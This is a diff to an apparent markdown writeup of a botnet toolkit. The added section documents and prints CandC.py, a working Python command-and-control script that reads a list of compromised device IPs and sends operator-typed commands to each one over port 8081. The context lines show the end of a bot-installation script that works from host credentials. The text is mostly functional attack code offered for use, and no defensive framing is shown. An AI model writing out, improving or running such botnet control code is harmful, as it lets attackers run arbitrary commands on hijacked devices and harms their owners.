@@ -123,3 +123,45 @@ for ip, username, password in hostlist:
 	installbots(ip, username, password)
 print("botted_hosts.txt written")
 ```
+
+
+### CandC.py Script
+lastly this script sends commands to all compromised devices provided. This script takes the path to a text file containing compromised device information as the first argument. The file is to be formatted as follows:
+` `
+
+
+```python
+#!/usr/bin/python3
+
+import socket, sys
+
+def read_bots(botfile):
+	with open(botfile, 'r') as file:
+		return [line.strip() for line in file]
+
+def send_command(botip, command):
+	try: 
+		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		#listener.settimeout(1)
+		listener.connect((botip, 8081))
+		listener.sendall(command.encode())
+		
+		data = listener.recv(1024)
+		print("Result from bot: " + botip + "\n" + data.decode() + "\n")
+	except Exception as e:
+		print( "Error connecting to " + botip + " Error: " + str(e) + "\n")
+
+
+botips = read_bots(sys.argv[1])
+while True:
+	command = input("Enter command: ")
+		
+	if command.lower() == 'exit':
+		break
+		
+	for bot_ip in botips:
+		result = send_command(bot_ip, command)
+		
+
+	
+```
